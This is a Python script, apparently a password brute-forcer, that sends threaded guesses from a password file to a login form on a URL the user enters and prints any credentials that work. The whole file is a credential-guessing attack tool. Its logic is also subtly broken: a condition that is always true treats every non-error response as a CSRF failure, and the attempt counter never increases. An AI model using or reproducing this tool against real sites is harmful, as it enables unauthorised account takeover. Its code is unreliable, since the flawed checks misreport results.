import threading
import sys
import requests
import time


class __bruteforce:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        start_msg = "starting the check....!"
        for x in start_msg:
            sys.stdout.write(x)
            sys.stdout.flush()
            time.sleep(0.04)

    def check(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        elif "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteForce failed!")
            sys.exit()
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.check(password):
            return

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = __bruteforce(url, username, error)
    
    with open("passwords.txt", "r") as file:
        chunk_size = 1000
        while True:
            passwords = file.readlines(chunk_size)
            if not passwords:
                break
            cracking_process = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            cracking_process.start()

if __name__ == '__main__':
     
    main()
